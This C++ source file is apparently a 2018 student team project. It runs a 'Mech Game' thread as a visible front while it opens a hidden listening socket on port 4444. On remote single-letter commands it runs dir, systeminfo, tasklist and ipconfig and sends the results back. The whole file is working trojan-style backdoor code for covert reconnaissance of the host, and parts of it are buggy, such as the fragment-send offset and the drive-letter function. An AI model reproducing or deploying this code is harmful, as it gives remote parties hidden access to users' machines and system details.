//Team Project Smith, Kreiser, Graham
//August 22, 2018


#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include "client.h"
#include "MechPlay.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <iostream>
#include <sstream>
#include <vector>
#include <array>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_PORT "4444"

void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);
void listFiles(std::vector<char>& outputBuffer, std::string directory = "C:\\*");
void setDriveLetter(std::string directory);
void printSystem(std::vector<char>& outputBuffer);
void printTasks(std::vector<char>& outputBuffer);
void printIP(std::vector<char>& outputBuffer);
std::string exec(const char* cmd);

int main(void)
{
	//Thread for the overhead Mech Game
	std::thread t(&MechPlay::Execute, MechPlay());


	WSADATA wsaData;
	int iResult;

	//Sets the socket needed for the connection
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ServerSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		//std::cout << "WSAStartup failed with error: " << iResult << std::endl;
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0)
	{
		//std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET)
	{
		//std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR)
	{
		//std::cout << "bind failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	// Accepts a listener socket
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR)
	{
		//std::cout << "listen failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Accept a client socket
	ServerSocket = accept(ListenSocket, NULL, NULL);
	if (ServerSocket == INVALID_SOCKET)
	{
		//std::cout << "accept failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	std::stringstream output;
	// No longer need listening socket
	closesocket(ListenSocket);
	// Receive until the peer shuts down the connection
	do {
		std::vector<char> inputBuffer(5000);
		std::vector<char> outputBuffer;
		//Receives any incoming buffers from the server
		iResult = recv(ServerSocket, inputBuffer.data(), inputBuffer.size(), 0);
		//std::cout << "Data has been received." << std::endl;
		//If the result is not -1, then resize inputBuffer to make sure that it can hold the bytes incoming
		if (iResult != -1)
		{
			inputBuffer.resize(iResult);
		}
		//If the result is not 0, information was pulled and can be processed
		if (iResult != 0)
		{
			//Central function that handles switch/cases for all the commands
			processCommand(inputBuffer, outputBuffer);
			char newbuffer[4096 * 2];
			//If the command asks for a result (at this stage, all will), the result needs to be sent back 
			//to the server
			int maxbuffer = 4096 * 2;
			int fragment = 0;
			if (outputBuffer.size() < maxbuffer)
			{
				iResult = send(ServerSocket, outputBuffer.data(), outputBuffer.size(), 0);
			}
			else
			{
				for (int i = 0; i < outputBuffer.size(); i++)
				{
					newbuffer[i % sizeof(newbuffer)] = outputBuffer[i];
					if ((i % maxbuffer) == (maxbuffer - 1) && i != 0)
					{
						//std::cout << outputBuffer[i] << std::endl;
						iResult = send(ServerSocket, &outputBuffer[(fragment++) * maxbuffer], maxbuffer, 0);
					}
				}
				if (!(outputBuffer.size() % maxbuffer == (maxbuffer - 1)))
				{
					iResult = send(ServerSocket, &outputBuffer[fragment], maxbuffer, 0);
				}
			}			
			char end = 0;
			iResult = send(ServerSocket, &end, sizeof(end), 0);
		}
		//If 0 bytes has been sent, then the server has shutdown and so should the client
		else
		{
			break;
		}
		outputBuffer.clear();
	} while (true);

	// shutdown the connection since we're done
	iResult = shutdown(ServerSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		//std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
		std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ServerSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ServerSocket);
	WSACleanup();
	return 0;
}
//Central function that handles switch/cases for all the commands
void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
{
	std::string directory = "C:\\*";
	std::string command = buffer.data();
	//setDriveLetter(directory);
	switch (buffer[0])
	{
	case 'd':
		//Calls the function to list files based on a directory provided
		//C:\ is used as a default
		//The outputBuffer has all the files and directory information listed
		listFiles(outputBuffer, directory);
		break;
	case 'i':
		//Calls the function to list files based on a directory provided
		//C:\ is used as a default
		//The outputBuffer has all the files and directory information listed
		printIP(outputBuffer);
		break;
	case 's':
		//Calls the function to list files based on a directory provided
		//C:\ is used as a default
		//The outputBuffer has all the files and directory information listed
		printSystem(outputBuffer);
		break;
	case 't':
		//Calls the function to list files based on a directory provided
		//C:\ is used as a default
		//The outputBuffer has all the files and directory information listed
		printTasks(outputBuffer);
		break;
	}
}
//Function to build a basic file structure outline of the client machine
void listFiles(std::vector<char>& outputBuffer, std::string directory)
{
	//String to build the output
	std::string build;
	build = "dir " + directory + " 2>&1";
	build = exec(build.c_str());
	for (auto& element : build)
	{
		//All characters are added into the buffer vector
		outputBuffer.push_back(element);
	}
}
void setDriveLetter(std::string directory)
{
	std::string tempDrive;	//temp choice for drive
	char tempLetter = 'c';

	std::cout << "Current drive is %s." << directory << std::endl; //Displays current drive 
	std::cout << "Would you like to change drives? ";	//Prompts user for change if desired
	std::getline(std::cin, tempDrive);//Takes in user's choice 
	//If users choice is any of the below options, user chooses new letter
	if (tempDrive == "y" || tempDrive == "Y" || tempDrive == "yes" || tempDrive == "Yes" || tempDrive == "YES")
	{
		std::cout << "Enter the new drive letter: ";	//Accepts new drive letter
		std::cin >> tempLetter;
		std::cin.clear();
		//Error checking for new drive letter
		if (isalpha((int)tempLetter) == false) //checks tempLetter to see if a letter
		{
			std::cout << "You entered invalid characters!" << std::endl;
			setDriveLetter(directory);//invalid character entry recalls setDriveLetter function
		}
	}
	else
	{
		directory = ("%c:\\*", toupper((int)tempLetter));//User indicated current drive letter is good.
	}
}
//Function that will return the system information of the client
void printSystem(std::vector<char>& outputBuffer)
{
	//String to build the output
	std::string build;
	build = exec("systeminfo 2>&1");
	for (auto& element : build)
	{
		//All characters are added into the buffer vector
		outputBuffer.push_back(element);
	}
}
//Function that will return the processes of the client
void printTasks(std::vector<char>& outputBuffer)
{
	//String to build the output
	std::string build;
	build = exec("tasklist 2>&1");
	for (auto& element : build)
	{
		//All characters are added into the buffer vector
		outputBuffer.push_back(element);
	}
}
//Function that will return the IP information of the client
void printIP(std::vector<char>& outputBuffer)
{
	//String to build the output
	std::string build;
	build = exec("ipconfig 2>&1");
	for (auto& element : build)
	{
		//All characters are added into the buffer vector
		outputBuffer.push_back(element);
	}
}
//Function for execution the function on the client
std::string exec(const char* cmd)
{
	std::array<char, 256> buffer;
	std::string result;
	//Opens a pipe for the purposes of running the cmd
	std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe)
		throw std::runtime_error("popen() failed!");
	//While there is data to grab, process that output into the string
	while (!feof(pipe.get()))
	{
		if (fgets(buffer.data(), 256, pipe.get()) != nullptr)
			result += buffer.data();
	}
	return result;
}
